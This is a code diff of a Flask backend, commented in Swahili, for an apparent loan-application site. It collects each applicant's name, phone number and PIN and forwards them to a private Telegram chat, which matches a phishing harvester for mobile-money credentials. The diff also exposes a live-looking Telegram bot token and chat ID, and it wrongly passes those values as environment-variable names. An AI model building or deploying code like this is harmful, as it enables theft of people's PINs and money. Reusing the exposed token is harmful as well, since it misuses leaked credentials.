@@ -1,75 +1,68 @@
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 import requests
-import random
+import os
 
 app = Flask(__name__)
+CORS(app)
 
-# 🔐 MIPANGILIO YA TELEGRAM
-BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
-CHAT_ID = "6958413637"
+BOT_TOKEN = os.environ.get("7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0")
+CHAT_ID = os.environ.get("6958413637")
 
-maombi = {}
+@app.route("/")
+def home():
+    return "Backend Running Successfully"
 
-# =========================
-# KUTUMA KWENYE TELEGRAM
-# =========================
-def tuma_kwenye_telegram(app_id, data):
-
-    ujumbe = f"""
-MAOMBI MAPYA YA MKOPO
-
-Namba ya Maombi: {app_id}
-Jina: {data['jina']}
-Kiasi: {data['kiasi']}
-Lengo: {data['lengo']}
-Muda: {data['muda']}
-PIN: {data['pin']}
-Hali: INASUBIRI (PENDING)
-"""
-
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-
-    requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": ujumbe
-    })
-
-# =========================
-# HATUA YA 3 ENDPOINT
-# =========================
 @app.route("/submit-step3", methods=["POST"])
 def submit_step3():
 
     try:
-        print("ROUTE HIT")
 
-        data = request.get_json(silent=True)
+        data = request.get_json()
 
-        if not data:
-            data = request.form.to_dict()
+        jina = data.get("jina")
+        namba = data.get("namba")
+        pin = data.get("pin")
 
-        print("DATA RECEIVED:", data)
+        message = f"""
+MKOPO MPYA
 
-        app_id = str(random.randint(10000, 99999))
+Jina: {jina}
+Namba: {namba}
+PIN: {pin}
+"""
 
-        maombi[app_id] = data
-        maombi[app_id]["status"] = "PENDING"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-        response = requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                "chat_id": CHAT_ID,
-                "text": f"📥 NEW APPLICATION\n\n🆔 {app_id}\n\n{data}"
-            }
-        )
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message
+        }
 
-        print("TELEGRAM RESPONSE:", response.text)
+        response = requests.post(url, json=payload)
 
-        return jsonify({
-            "message": "Success",
-            "application_id": app_id
-        })
+        print(response.text)
+
+        if response.status_code == 200:
+
+            return jsonify({
+                "status": "success",
+                "message": "Sent to Telegram"
+            })
+
+        else:
+
+            return jsonify({
+                "status": "error",
+                "message": response.text
+            })
 
     except Exception as e:
-        print("ERROR:", str(e))
-        return jsonify({"error": str(e)}), 500
+
+        return jsonify({
+            "status": "error",
+            "message": str(e)
+        })
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
